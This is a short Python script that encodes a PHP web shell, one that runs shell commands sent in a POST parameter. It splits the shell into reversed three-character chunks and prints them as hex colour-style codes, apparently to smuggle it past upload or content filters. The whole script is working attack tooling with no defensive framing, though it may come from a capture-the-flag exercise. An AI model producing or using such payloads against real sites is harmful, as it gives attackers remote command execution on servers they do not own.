payload = "<?php echo system($_POST['a']);?>"

payload = [list(payload[j:j+3]) for j in range(0, len(payload), 3)]

for i in payload:
    out = "#"
    for j in i[::-1]:
        out += hex(ord(j))[2:]
    print(out)
